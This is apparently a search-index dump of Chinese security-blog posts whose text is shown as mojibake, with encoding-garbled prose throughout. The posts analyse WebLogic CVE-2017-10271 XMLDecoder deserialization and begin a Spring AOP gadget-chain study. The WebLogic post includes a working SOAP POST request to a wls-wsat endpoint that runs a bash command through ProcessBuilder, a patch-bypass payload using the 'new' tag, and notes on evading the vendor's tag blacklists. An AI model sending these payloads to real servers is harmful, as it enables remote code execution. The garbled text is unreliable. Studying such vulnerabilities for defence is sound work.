ä¸ºè¿™é‡Œæ˜¯é€šè¿‡ T3 åè®®çš„è¯·æ±‚æ¥æ‰“ï¼Œå¯ä»¥è®© Web ä»£ç†çš„æ–¹å¼åªèƒ½è½¬å‘ HTTP çš„è¯·æ±‚ï¼Œè¿™æ ·ä¹Ÿèƒ½é˜²ä½ ","date":"2025-05-11","objectID":"/posts/705d533/:2:5","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"å°ç»“\ræŒºç®€å•çš„ï¼Œç”¨ T3 åè®®æ—¶ä¼šååºåˆ—åŒ–è¯·æ±‚ä¸»ä½“ä¸­é™¤ä¸€äº›å›ºå®šæ•°æ®ï¼ˆT3 åè®®è‡ªå¸¦çš„æ•°æ®ï¼‰å¤–çš„æ•°æ®ï¼Œæ”¹è¿™éƒ¨åˆ†ä¸ºæ¶æ„åºåˆ—åŒ–æ•°æ®å°±å¥½äº† åç»­å°±æ˜¯åŠ è¡¥ä¸ï¼Œå¯ä»¥æ‰¾é»‘åå•å¤–çš„ç±»ç»•è¿‡ï¼Œè¿˜èƒ½æ‰“ jrmp ","date":"2025-05-11","objectID":"/posts/705d533/:2:6","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"CVE-2017-10271 WebLogic XMLDecoderååºåˆ—åŒ–\r","date":"2025-05-11","objectID":"/posts/705d533/:3:0","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"å‰ç½®å­¦ä¹ \rè¿™é‡Œç¯å¢ƒè¿˜æ˜¯ç”¨çš„ jdk7u21 + weblogic 10.3.6 XMLEncoder å’Œ XMLDecoder\rXMLDecoder/XMLEncoder æ˜¯åœ¨JDK1.4ç‰ˆä¸­æ·»åŠ çš„ XML æ ¼å¼åºåˆ—åŒ–æŒä¹…æ€§æ–¹æ¡ˆï¼Œä½¿ç”¨ XMLEncoder æ¥ç”Ÿæˆè¡¨ç¤º JavaBeans ç»„ä»¶(bean)çš„ XML æ–‡æ¡£ï¼Œç”¨ XMLDecoder è¯»å–ä½¿ç”¨ XMLEncoder åˆ›å»ºçš„ XML æ–‡æ¡£è·å– JavaBeansã€‚ ç®€å•æ¥è¯´å°±æ˜¯ Encoder æŠŠ javabeans å˜æˆ xml æ ¼å¼ï¼ŒDecoder æŠŠ xml æ ¼å¼å˜æˆ Javabeans demo\rå†™ä¸ªæ ‡å‡†çš„ javabean ç±»æ–¹ä¾¿åç»­ encoder å¤„ç† package org.example; import java.io.Serializable; public class person implements Serializable { private String name; private int age; //XMLEncoderè¦æ±‚ç±»å¿…é¡»æ˜¯æ ‡å‡†çš„ JavaBean,å¿…é¡»æœ‰æ— å‚æ„é€ æ–¹æ³• public person() {} public person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } } Encoder\rpackage org.example; import java.beans.XMLEncoder; import java.io.FileNotFoundException; import java.io.FileOutputStream; public class encoder { public static void main(String[] args) throws FileNotFoundException { person person1 = new person(\"6s6\", 18); FileOutputStream fos = new FileOutputStream(\"encode.xml\"); XMLEncoder encoder = new XMLEncoder(fos); encoder.writeObject(person1); encoder.close(); } } è¾“å‡ºçš„encoder.xmlä¸º \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cjava version=\"1.7.0_21\" class=\"java.beans.XMLDecoder\"\u003e \u003cobject class=\"org.example.person\"\u003e \u003cvoid property=\"age\"\u003e \u003cint\u003e18\u003c/int\u003e \u003c/void\u003e \u003cvoid property=\"name\"\u003e \u003cstring\u003e6s6\u003c/string\u003e \u003c/void\u003e \u003c/object\u003e \u003c/java\u003e Decoder\rpackage org.example; import java.beans.XMLDecoder; import java.io.FileInputStream; import java.io.FileNotFoundException; public class decoder { public static void main(String[] args) throws FileNotFoundException { FileInputStream fis = new FileInputStream(\"D:\\\\14.Java\\\\java_test\\\\test\\\\encode.xml\"); XMLDecoder decoder = new XMLDecoder(fis); person decodedPerson = (person) decoder.readObject(); System.out.println(\"Name: \" + decodedPerson.getName()); System.out.println(\"Age: \" + decodedPerson.getAge()); } } è¾“å‡ºä¸º Name: 6s6 Age: 18 XMLåŸºç¡€å±æ€§\rstring æ ‡ç­¾\rhello,xml å­—ç¬¦ä¸²çš„è¡¨ç¤ºæ–¹å¼ä¸º \u003cstring\u003ehello,xml\u003c/string\u003e object æ ‡ç­¾\ré€šè¿‡ \u003cobject\u003e æ ‡ç­¾è¡¨ç¤ºå¯¹è±¡ï¼Œ class å±æ€§æŒ‡å®šå…·ä½“ç±»(ç”¨äºè°ƒç”¨å…¶å†…éƒ¨æ–¹æ³•)ï¼Œmethod å±æ€§æŒ‡å®šå…·ä½“æ–¹æ³•åç§°ï¼ˆæ¯”å¦‚æ„é€ å‡½æ•°çš„çš„æ–¹æ³•åä¸º new ï¼‰ void æ ‡ç­¾\ré€šè¿‡ void æ ‡ç­¾è¡¨ç¤ºå‡½æ•°è°ƒç”¨ã€èµ‹å€¼ç­‰æ“ä½œï¼Œ method å±æ€§æŒ‡å®šå…·ä½“çš„æ–¹æ³•åç§° arrayæ ‡ç­¾\ré€šè¿‡ array æ ‡ç­¾è¡¨ç¤ºæ•°ç»„ï¼Œ class å±æ€§æŒ‡å®šå…·ä½“ç±»ï¼Œå†…éƒ¨ void æ ‡ç­¾çš„ index å±æ€§è¡¨ç¤ºæ ¹æ®æŒ‡å®šæ•°ç»„ç´¢å¼•èµ‹å€¼ ","date":"2025-05-11","objectID":"/posts/705d533/:3:1","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"åˆ©ç”¨æ¡ä»¶\rä½¿ç”¨ WLS-WebServices ç»„ä»¶ WebLogic æ¶‰åŠç‰ˆæœ¬ 10.3.6.0 12.1.3.0.0 12.2.1.1.0 12.2.1.2.0 ","date":"2025-05-11","objectID":"/posts/705d533/:3:2","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"æ¼æ´åˆ†æ\råŸç†è§£æ\rä¸Šé¢çœ‹åˆ°äº† Decoder å¯ä»¥æŠŠ xml è§£ææˆ Javabeansï¼Œè€Œè¿™é‡Œ WebLogic çš„ WLS Security ç»„ä»¶å¯¹å¤–æä¾›å¾— WebService æœåŠ¡ï¼Œå°±æ˜¯ä½¿ç”¨ XMLDecoder æ¥è§£æ XML æ ¼å¼æ•°æ®ï¼Œå…¶å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œä»è€Œå¯¼è‡´ RCEï¼Œæ¥çœ‹ä¸ªdemo decode.java package org.example; import java.beans.XMLDecoder; import java.io.BufferedInputStream; import java.io.FileInputStream; public class decoder { public static void main(String[] args) throws Exception { FileInputStream file = new FileInputStream(\"D:\\\\14.Java\\\\java_test\\\\test\\\\poc.xml\"); XMLDecoder xmlDecoder = new XMLDecoder(new BufferedInputStream(file)); Object result = xmlDecoder.readObject(); xmlDecoder.close(); } } poc.xml \u003cjava version=\"1.4.0\" class=\"java.beans.XMLDecoder\"\u003e \u003cvoid class=\"java.lang.ProcessBuilder\"\u003e \u003carray class=\"java.lang.String\" length=\"1\"\u003e \u003cvoid index=\"0\"\u003e \u003cstring\u003eCalc\u003c/string\u003e \u003c/void\u003e \u003c/array\u003e \u003cvoid method=\"start\"/\u003e\u003c/void\u003e \u003c/java\u003e è§£æè¿™ä¸ªxmlï¼Œç›¸å½“äºç”¨ java.lang.ProcessBuilder æ¥ rceï¼Œç›¸å½“äºæ‰§è¡Œä»¥ä¸‹ä»£ç  String[] cmd = new String[1]; cmd[0] = \"Calc\"; new ProcessBuilder(cmd).start(); æ¼æ´å¤ç°\rä¸‹é¢å‡ ä¸ªè·¯ç”±éƒ½èƒ½è§£æ xml /wls-wsat/CoordinatorPortType /wls-wsat/RegistrationPortTypeRPC /wls-wsat/ParticipantPortType /wls-wsat/RegistrationRequesterPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationRequesterPortType11 POST è¯·æ±‚åŒ… POST /wls-wsat/RegistrationRequesterPortType11 HTTP/1.1 Host: 192.168.2.128:7001 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Connection: keep-alive Cookie: ADMINCONSOLESESSION=pG6NyP1TRTBQpCtbTcGdmT4FHw76PxC1nn6WrKbLVGhQ1LtxJLJv!441898134 Upgrade-Insecure-Requests: 1 Priority: u=0, i Content-Type: text/xml Content-Length: 680 \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e \u003csoapenv:Header\u003e \u003cwork:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"\u003e \u003cjava version=\"1.4.0\" class=\"java.beans.XMLDecoder\"\u003e \u003cvoid class=\"java.lang.ProcessBuilder\"\u003e \u003carray class=\"java.lang.String\" length=\"3\"\u003e \u003cvoid index=\"0\"\u003e \u003cstring\u003e/bin/bash\u003c/string\u003e \u003c/void\u003e \u003cvoid index=\"1\"\u003e \u003cstring\u003e-c\u003c/string\u003e \u003c/void\u003e \u003cvoid index=\"2\"\u003e \u003cstring\u003eecho \"/wls-wsat/RegistrationRequesterPortType11\"\u003e\u003e/tmp/eeee\u003c/string\u003e \u003c/void\u003e \u003c/array\u003e \u003cvoid method=\"start\"/\u003e\u003c/void\u003e \u003c/java\u003e \u003c/work:WorkContext\u003e \u003c/soapenv:Header\u003e \u003csoapenv:Body/\u003e \u003c/soapenv:Envelope\u003e æ ¹æ®è¦æ‰§è¡Œçš„å‘½ä»¤è°ƒæ•´ index å’Œå¯¹åº”çš„å‚æ•°å°±å¥½äº† ç¨å¾®è§£é‡Šä¸€ä¸‹ä»¥ä¸Š poc ï¼Œxml éƒ¨åˆ†ä¸å¤šè¯´ï¼Œè¯´ä¸‹SOAP è¯·æ±‚ç»“æ„ Envelopeï¼šå®šä¹‰äº† SOAP æ¶ˆæ¯çš„å¤–å±‚ç»“æ„ï¼Œä½¿ç”¨çš„æ˜¯æ ‡å‡†çš„ SOAP Envelope å‘½åç©ºé—´ã€‚ Headerï¼šSOAP æ¶ˆæ¯ä¸­ç”¨æ¥åŒ…å«å¤´éƒ¨ä¿¡æ¯ï¼Œè¿™é‡Œç‰¹åˆ«ä½¿ç”¨äº† WorkContextï¼Œè¿™æ˜¯ WebLogic Server ç‰¹æœ‰çš„æœºåˆ¶ï¼Œç”¨äºåœ¨ SOAP è¯·æ±‚ä¸­ä¼ é€’ä¸Šä¸‹æ–‡æˆ–çŠ¶æ€ä¿¡æ¯ã€‚ æ‰€ä»¥è¿™ä¸ªæ´çš„æœ¬è´¨å…¶å®æ˜¯é€šè¿‡ä¼ªé€ çš„ SOAP æŠ¥æ–‡ï¼ŒæŠŠæ¶æ„çš„ XML æ•°æ®å‘é€åˆ°æœåŠ¡å™¨ç«¯ï¼Œç”±æœåŠ¡å™¨çš„ XMLDecoder è§£æå¹¶å®ä¾‹åŒ–å¯¹è±¡ï¼Œä»è€Œè§¦å‘ä»»æ„ä»£ç æ‰§è¡Œ ä»£ç åˆ†æ\rserver/lib/wls-wsat.war/WEB-INF/web.xml ä¸­çš„æ¥å£éƒ½èƒ½å¯¹ SOAP æŠ¥æ–‡è¿›è¡Œå¤„ç†ï¼Œä¹Ÿå°±æ˜¯åˆšæ‰é‚£å‡ ä¸ªå­˜åœ¨æ¼æ´çš„è·¯ç”±æ¥å£ å®šä½åˆ° weblogic.wsee.jaxws.workcontext.WorkContextServerTube çš„ processRequest æ–¹æ³•ï¼Œè¿™é‡Œå¯¹æˆ‘ä»¬ POST æ•°æ®åŒ…ä¸­çš„ SOAP æ•°æ®è¿›è¡Œäº†å¤„ç† è¿™é‡Œå¯ä»¥çœ‹åˆ° var1 å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ xml æ•°æ®ï¼Œvar2 å°±æ˜¯ç­›é€‰å‡ºäº†XML ä¸­ \u003csoapenv:Header\u003e æ ‡ç­¾ä¸‹çš„æ‰€æœ‰å­å…ƒç´  ç„¶åæŠŠ var3 æ”¾è¿›äº† readHeaderOld() æ–¹æ³•è¿›è¡Œå¤„ç† protected void readHeaderOld(Header var1) { try { XMLStreamReader var2 = var1.readHeader(); var2.nextTag(); var2.nextTag(); XMLStreamReaderToXMLStreamWriter var3 = new XMLStreamReaderToXMLStreamWriter(); ByteArrayOutputStream var4 = new ByteArrayOutputStream(); XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4); var3.bridge(var2, var5); var5.close(); WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray())); this.receive(var6); } catch (XMLStreamException var7) { throw new WebServiceException(var7); } catch (IOException var8) { throw new WebServiceException(var8); } } å…ˆæ˜¯åˆ›å»ºäº†ä¸ªç”¨æ¥è¯» xml çš„ var2ï¼Œç„¶ååˆ›å»ºäº†è¾“å…¥æµå’Œè¾“å‡ºæµï¼Œå°† xml æ•°æ®å†™åˆ° var4 ä¸­ï¼Œæœ€åå°±æ˜¯ var6 çš„æ„é€ äº†ï¼Œè·Ÿè¿› WorkContextXmlInputAdapter public WorkContextXmlInputAdapter(InputStream var1) { this.xmlDecoder = new XMLDecoder(var1); } new äº†ä¸ª XMLDecoderï¼Œå¹¶å°† var4 å†™è¿›å»äº†ï¼Œç„¶åè·Ÿè¿› receive æ–¹æ³• protected void receive(WorkContextInput var1) throws IOException { WorkContextMapIntercept","date":"2025-05-11","objectID":"/posts/705d533/:3:3","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"æ¼æ´ä¿®å¤\rCVE-2017-3506 è¡¥ä¸åˆ†æ\råœ¨ weblogic.wsee.workarea.WorkContextXmlInputAdapter ä¸­æ·»åŠ äº† validate éªŒè¯ï¼Œé™åˆ¶äº† object æ ‡ç­¾ private void validate(InputStream is) { WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try { SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() { public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException { if(qName.equalsIgnoreCase(\"object\")) { throw new IllegalStateException(\"Invalid context type: object\"); } } }); } catch (ParserConfigurationException var5) { throw new IllegalStateException(\"Parser Exception\", var5); } catch (SAXException var6) { throw new IllegalStateException(\"Parser Exception\", var6); } catch (IOException var7) { throw new IllegalStateException(\"Parser Exception\", var7); } } å°† object ä¿®æ”¹æˆ void å³å¯ç»•è¿‡ï¼Œæ¯”å¦‚åƒ payload ä¸­ç”¨ ProcessBuilder.start() è¿™ç§æ²¡æœ‰è¿”å›å€¼çš„æ–¹æ³•æ¥ rceæ—¶å°±èƒ½ç”¨ void æ¥ç»•è¿‡ï¼Œç”¨ new ä¹Ÿæ˜¯å¯ä»¥çš„ \u003cjava version=\"1.4.0\" class=\"java.beans.XMLDecoder\"\u003e \u003cnew class=\"java.lang.ProcessBuilder\"\u003e \u003cstring\u003ecalc\u003c/string\u003e \u003cmethod name=\"start\" /\u003e \u003c/new\u003e \u003c/java\u003e CVE-2017-10271 è¡¥ä¸åˆ†æ\rprivate void validate(InputStream is) { WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try { SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() { private int overallarraylength = 0; public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException { if(qName.equalsIgnoreCase(\"object\")) { throw new IllegalStateException(\"Invalid element qName:object\"); } else if(qName.equalsIgnoreCase(\"new\")) { throw new IllegalStateException(\"Invalid element qName:new\"); } else if(qName.equalsIgnoreCase(\"method\")) { throw new IllegalStateException(\"Invalid element qName:method\"); } else { if(qName.equalsIgnoreCase(\"void\")) { for(int attClass = 0; attClass \u003c attributes.getLength(); ++attClass) { if(!\"index\".equalsIgnoreCase(attributes.getQName(attClass))) { throw new IllegalStateException(\"Invalid attribute for element void:\" + attributes.getQName(attClass)); } } } if(qName.equalsIgnoreCase(\"array\")) { String var9 = attributes.getValue(\"class\"); if(var9 != null \u0026\u0026 !var9.equalsIgnoreCase(\"byte\")) { throw new IllegalStateException(\"The value of class attribute is not valid for array element.\"); } è¿˜æ˜¯é»‘åå•ï¼ŒåˆåŠ äº†å‡ ä¸ªæ ‡ç­¾ï¼Œå‚çœ‹xmldecoderçš„å®˜æ–¹æ–‡æ¡£å¾ˆå®¹æ˜“å‘ç° class æ ‡ç­¾å¯ä»¥åŠ¨æ€åŠ è½½ä»»æ„ç±» æ ¹æ®ä¸Šé¢è¡¥ä¸çš„è¦æ±‚ï¼Œæˆ‘ä»¬çŸ¥é“æ‰€åˆ©ç”¨çš„ç±»éœ€è¦æ»¡è¶³æ„é€ æ–¹æ³•å­˜åœ¨åˆ©ç”¨ç‚¹ï¼Œä¸”å…¶æ„é€ æ–¹æ³•çš„å‚æ•°ç±»å‹æ°å¥½æ˜¯å­—èŠ‚æ•°ç»„æˆ–è€…æ˜¯javaä¸­çš„åŸºç¡€æ•°æ®ç±»å‹ï¼Œæ¯”å¦‚stringï¼Œintè¿™äº›ï¼Œåˆšå¥½ oracle.toplink.internal.sessions.UnitOfWorkChangeSet å°±æ»¡è¶³ ç›´æ¥å°†ä¼ å…¥çš„æ•°æ®ååºåˆ—åŒ–äº†ï¼Œweblogicå­˜åœ¨ä¸€ä¸ªè‡ªå¸¦jreç¯å¢ƒçš„ç‰ˆæœ¬ï¼Œä¸”è‡ªå¸¦çš„jdkç‰ˆæœ¬ä¸º1.6+ï¼Œå¯ä»¥åˆ©ç”¨jdk7u21 gadgetè¾¾åˆ°RCEï¼Œä¹Ÿå¯ä»¥æ‰“ ccï¼Œä¹‹å‰åœ¨ T3 çš„æ—¶å€™å°±çŸ¥é“èƒ½æ‰“éƒ¨åˆ† ccï¼Œè€Œä¸”weblogicè¿˜æœ‰ spring çš„ç»„ä»¶ï¼Œå¯ä»¥åˆ©ç”¨FileSystemXmlApplicationContextå’ŒClassPathXmlApplicationContextç±»åŠ è½½springçš„é…ç½®æ–‡ä»¶ï¼Œæ‰“springçš„ä¾èµ–æ³¨å…¥ åç»­çš„banäº†classæ ‡ç­¾ï¼Œè¿˜å¯ä»¥é€šè¿‡ \u003carray method=\"forName\"\u003e æ¥ç»•è¿‡ï¼Œè²Œä¼¼åªæœ‰ jdk1.6 èƒ½æ‰“ï¼Œå› ä¸ºå…¶XMLDecoderä¸é«˜ç‰ˆæœ¬çš„ä¸åŒ æœ€åå°±ç´¢æ€§ä¹Ÿé™åˆ¶äº†arrayå…ƒç´ çš„é•¿åº¦ æ®æ­¤ï¼Œæœ‰ä½¬ç»™å‡ºäº†XMLDecoderå®˜æ–¹æ–‡æ¡£çš„ä¸€å¥è¯ ä½†è²Œä¼¼ä¸è¡Œï¼Œå¦‚æœè¶…å‡ºäº†æŒ‡å®šçš„ length ï¼Œåº”è¯¥è¿˜æ˜¯ä¼šæŠ¥é”™ï¼Œæš‚æ—¶ä¸æ·±ç©¶äº† ","date":"2025-05-11","objectID":"/posts/705d533/:3:4","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"å°ç»“\råŸç†ä¹Ÿè¯´è¿‡ï¼Œå°±æ˜¯é€šè¿‡ä¼ªé€ çš„ SOAP æŠ¥æ–‡ï¼ŒæŠŠæ¶æ„çš„ XML æ•°æ®å‘é€åˆ°æœåŠ¡å™¨ç«¯ï¼Œç”±æœåŠ¡å™¨çš„ XMLDecoder è§£æå¹¶å®ä¾‹åŒ–å¯¹è±¡ï¼ˆååºåˆ—åŒ–ï¼‰ï¼Œä»è€Œè§¦å‘ä»»æ„ä»£ç æ‰§è¡Œã€‚ç”¨äºå¤„ç† SOAP æŠ¥æ–‡çš„é‚£å‡ ä¸ªè·¯ç”±éƒ½èƒ½æ‰“ï¼Œåç»­ç»•è¿‡çš„è¯å°±æ˜¯ç¿» XMLDecoder å®˜æ–¹æ–‡æ¡£æ‰¾é»‘åå•å¤–çš„æ ‡ç­¾ï¼Œæ¯”å¦‚è¿‡æ»¤äº† object ï¼Œå°±è¦ void ã€new æ¥ç»•è¿‡ï¼Œéƒ½ç¦ç”¨äº†ï¼Œç”¨ class æ¥åŠ¨æ€åŠ è½½ç±»ï¼Œæœ€åè¿˜å¯ä»¥ \u003carray method=\"forName\"\u003e æ¥ç»•è¿‡ classï¼Œä½†æ‰€éœ€çš„ jdk ç‰ˆæœ¬å¤ªä½äº†ï¼Œæ„Ÿè§‰è¶Šåˆ°åé¢è¶Šæ²¡å•¥ç”¨ ","date":"2025-05-11","objectID":"/posts/705d533/:3:5","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"å‚è€ƒ\rhttps://drun1baby.top/2023/02/09/CVE-2017-10271-WebLogic-XMLDecoder/ https://xz.aliyun.com/news/4656 https://www.freebuf.com/vuls/206374.html https://xz.aliyun.com/news/4656 ","date":"2025-05-11","objectID":"/posts/705d533/:3:6","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"æ€»ç»“\ræ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œæ„Ÿè§‰åˆ©ç”¨é¢æ¯”è¾ƒçª„ï¼Œä¹Ÿæ²¡æ‰“è¿‡å•¥å®æˆ˜ï¼Œä¹Ÿä¸æ¸…æ¥šå…¶å® ","date":"2025-05-11","objectID":"/posts/705d533/:4:0","tags":["Java"],"title":"Weblogicå­¦ä¹ (1)","uri":"/posts/705d533/"},{"categories":["Java"],"content":"SpringAOPé“¾\r","date":"2025-05-11","objectID":"/posts/816babd/:1:0","tags":["Java"],"title":"SpringAOPé“¾å­¦ä¹ ","uri":"/posts/816babd/"},{"categories":["Java"],"content":"ç®€ä»‹\rè¯¦æƒ…å‚è€ƒï¼šhttps://blog.csdn.net/Cr1556648487/article/details/126777903 AOPï¼ˆAspect Orient Programmingï¼‰ï¼Œç›´è¯‘è¿‡æ¥å°±æ˜¯ é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ŒAOP æ˜¯ä¸€ç§ç¼–ç¨‹æ€æƒ³ï¼Œæ˜¯é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆOOPï¼‰çš„ä¸€ç§è¡¥å…… é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼Œå®ç°åœ¨ä¸ä¿®æ”¹æºä»£ç çš„æƒ…å†µä¸‹ç»™ç¨‹åºåŠ¨æ€ç»Ÿä¸€æ·»åŠ é¢å¤–åŠŸèƒ½çš„ä¸€ç§æŠ€æœ¯ï¼ŒAOPå¯ä»¥æ‹¦æˆªæŒ‡å®šçš„æ–¹æ³•å¹¶ä¸”å¯¹æ–¹æ³•å¢å¼ºï¼Œè€Œä¸”æ— éœ€ä¾µå…¥åˆ°ä¸šåŠ¡ä»£ç ä¸­ï¼Œä½¿ä¸šåŠ¡ä¸éä¸šåŠ¡å¤„ç†é€»è¾‘åˆ†ç¦»ï¼Œæ¯”å¦‚Springçš„äº‹åŠ¡ï¼Œé€šè¿‡äº‹åŠ¡çš„æ³¨è§£é…ç½®ï¼ŒSpringä¼šè‡ªåŠ¨åœ¨ä¸šåŠ¡æ–¹æ³•ä¸­å¼€å¯ã€æäº¤ä¸šåŠ¡ï¼Œå¹¶ä¸”åœ¨ä¸šåŠ¡å¤„ç†å¤±è´¥æ—¶ï¼Œæ‰§è¡Œç›¸åº”çš„å›æ»šç­–ç•¥ã€‚ ä¸»è¦åº”ç”¨åœºæ™¯åœ¨æ—¥å¿—è®°å½•ã€äº‹åŠ¡ç®¡ç†ã€æƒé™éªŒè¯ã€æ€§èƒ½ç›‘æµ‹ Springçš„AOPå®ç°åŸç†å…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡åŠ¨æ€ä»£ç†å®ç°çš„ï¼Œå…¶é‡‡ç”¨äº†ä¸¤ç§æ··åˆçš„å®ç°æ–¹å¼ï¼šJDK åŠ¨æ€ä»£ç†å’Œ CGLib åŠ¨æ€ä»£ç†ã€‚ JDKåŠ¨æ€ä»£ç†ï¼šSpring AOPçš„é¦–é€‰æ–¹æ³•ã€‚ æ¯å½“ç›®æ ‡å¯¹è±¡å®ç°ä¸€ä¸ªæ¥å£æ—¶ï¼Œå°±ä¼šä½¿ç”¨JDKåŠ¨æ€ä»£ç†ã€‚ç›®æ ‡å¯¹è±¡å¿…é¡»å®ç°æ¥å£ CGLIBä»£ç†ï¼šå¦‚æœç›®æ ‡å¯¹è±¡æ²¡æœ‰å®ç°æ¥å£ï¼Œåˆ™å¯ä»¥ä½¿ç”¨CGLIBä»£ç†ã€‚ ","date":"2025-05-11","objectID":"/posts/816babd/:2:0","tags":["Java"],"title":"SpringAOPé“¾å­¦ä¹ ","uri":"/posts/816babd/"},{"categories":["Java"],"content":"ç¯å¢ƒæ­å»º\råªéœ€è¦æ·»åŠ  spring-boot-starter-aop è¿™ä¸ªä¾èµ–ï¼Œè¿™ä¸ªä¾èµ–åŒ…æ‹¬spring-aopå’ŒaspectJWeaverè¿™ä¸¤ä¸ªæ‰€éœ€ä¾èµ– \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-aop\u003c/artifactId\u003e \u003cversion\u003e3.3.10\u003c/version\u003e \u003c/dependency\u003e ","date":"2025-05-11","objectID":"/posts/816babd/:3:0","tags":["Java"],"title":"SpringAOPé“¾å­¦ä¹ ","uri":"/posts/816babd/"},{"categories":["Java"],"content":"è°ƒç”¨é“¾åˆ†æ\r","date":"2025-05-11","objectID":"/posts/816babd/:4:0","tags":["Java"],"title":"SpringAOPé“¾å­¦ä¹ ","uri":"/posts/816babd/"},{"categories":["Java"],"content":"sinkç‚¹AbstractAspectJAdvice\rsink ç‚¹æ˜¯ org.springframework.aop.aspectj åŒ…ä¸‹çš„ AbstractAspectJAdvice ç±»ä¸­çš„ invokeAdviceMethodWithGivenArgs æ–¹æ³• protected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable { Object[] actualArgs = args; if (this.aspectJAdviceMethod.getParameterCount() == 0) { actualArgs = null; } try { ReflectionUtils.makeAccessible(this.aspectJAdviceMethod); return this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs); } catch (IllegalArgumentException var4) { throw new AopInvocationException(\"Mismatch on arguments to advice method [\" + this.aspectJAdviceMethod + \"]; pointcut expression [\" + this.pointcut.getPointcutExpression() + \"]\", var4); } catch (InvocationTargetException var5) { throw var5.getTargetException(); } } è¿™é‡Œå¾ˆæ˜æ˜¾ç›´æ¥å°±åå°„è°ƒç”¨äº† è¿™é‡Œ this.aspectJAdviceMethod åœ¨æ„é€ å‡½æ•°ä¸­å®šä¹‰ è¿™ä¸ªç±»ç»§æ‰¿äº† Serializable æ¥å£çš„ï¼Œæ˜¯ä¸ªæŠ½è±¡ç±» åœ¨å…¶å­ç±»ä¸­æˆ‘ä»¬å¯ä»¥å‘ç° AspectJAroundAdvice çš„ invoke æ–¹æ³•è°ƒç”¨äº† invokeAdviceMethodï¼Œç„¶åå°±ä¼šè§¦å‘ invokeAdviceMethodWithGivenArgsï¼Œè€Œä¸”è¿™é‡Œå¯¹ aspectJAroundAdviceMethod çš„èµ‹å€¼ä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥ä¼ å°±å¥½äº† åå°„è°ƒç”¨æ–¹æ³•çš„ä¸‰è¦ç´ ï¼šmethodã€objã€argsï¼Œç°åœ¨ method æœ‰äº†ï¼Œ args å…ˆä¸è¯´ï¼Œæœ‰çš„æ˜¯æ— å‚æ–¹æ³•ç”¨ï¼Œçœ‹çœ‹æ€ä¹ˆå®ç° objï¼Œè·Ÿè¿›çœ‹ä¸‹ this.aspectInstanceFactory çš„å®ç° private final AspectInstanceFactory aspectInstanceFactory; æ˜¯ä¸€ä¸ª AspectInstanceFactory ç±»å‹çš„å€¼ï¼Œç»§ç»­è·Ÿè¿›ï¼Œå‘ç°å…¶æ˜¯ä¸ªæ¥å£ï¼Œæœ‰å‡ ä¸ªå®ç°ç±» ç°åœ¨æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ‰¾åˆ°ä¸€ä¸ªåŒæ—¶å®ç° AspectInstanceFactory å’Œ Serializable çš„å­ç±»ï¼Œå¹¶ä¸” getAspectInstance æ–¹æ³•å¯ä»¥è¿”å›æŒ‡å®šçš„å¯¹è±¡ï¼Œåˆšå¥½ SingletonAspectInstanceFactory å°±æ»¡è¶³ å› æ­¤å°±å¯ä»¥åŸºæœ¬ç¡®å®š org.springframework.aop.aspectj.AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs ä¸ºæœ€ç»ˆçš„ sink ç‚¹ ","date":"2025-05-11","objectID":"/posts/816babd/:4:1","tags":["Java"],"title":"SpringAOPé“¾å­¦ä¹ ","uri":"/posts/816babd/"},{"categories":["Java"],"content":"ä¸­é—´é“¾åˆ†æ\rå¯ä»¥è·Ÿè¿›ä¸€ä¸‹ä¸Šé¢ç¡®å®šçš„sinkç‚¹ï¼Œå¯ä»¥è·Ÿåˆ° 